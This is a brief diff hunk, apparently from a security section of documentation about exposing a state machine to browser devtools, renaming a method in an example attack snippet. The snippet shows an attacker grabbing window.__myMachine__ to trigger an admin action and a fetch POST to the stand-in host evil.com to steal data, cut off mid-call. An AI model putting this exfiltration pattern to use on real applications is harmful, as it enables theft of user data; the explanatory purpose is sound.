@@ -59,7 +59,7 @@ All commands and payloads are validated before execution:
 // Attacker doesn't need the devtools bridge - they have the machine!
 const machine = window.__myMachine__;
 machine.send({ type: "admin_action" });
-machine.resetMachine();
+machine.resetJourney();
 // Or just steal data directly
 fetch("https://evil.com/steal", {
   method: "POST",
